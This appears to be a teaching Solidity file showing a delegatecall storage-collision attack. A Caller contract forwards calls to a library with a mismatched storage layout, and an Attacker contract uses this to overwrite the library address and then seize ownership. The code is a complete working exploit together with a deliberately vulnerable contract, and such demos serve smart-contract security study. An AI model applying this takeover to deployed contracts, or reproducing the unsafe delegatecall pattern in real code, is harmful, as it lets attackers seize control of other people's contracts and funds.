// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

contract Lib {
    uint public number;

    function changeVariable(uint _number) public {
        number = _number;
    }
}

contract Caller {
    address public lib;
    address public owner;
    uint public number;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function changeVariable(uint _number) public {
        lib.delegatecall(abi.encodeWithSignature("changeVariable(uint256)", _number));
    }
}

contract Attacker {

    // Needs to have these attributes to hijack the library.
    address public lib;
    address public owner;
    uint public number;

    Caller public caller;

    constructor(Caller _caller) {
        caller = Caller(_caller);
    }

    // Function that will change the owner of the caller contract
    function changeVariable(uint _number) public {
        owner = msg.sender;
    }

    function hijackLibrary() public {
        caller.changeVariable(addressToUInt(address(this))); 
    }

    function changeOwner() public {
        caller.changeVariable(100);                          
    }

    // Utility function to convert an address to an uint. 
    function addressToUInt(address a) internal pure returns (uint256) {
        return uint256(uint160(a));
    }
}
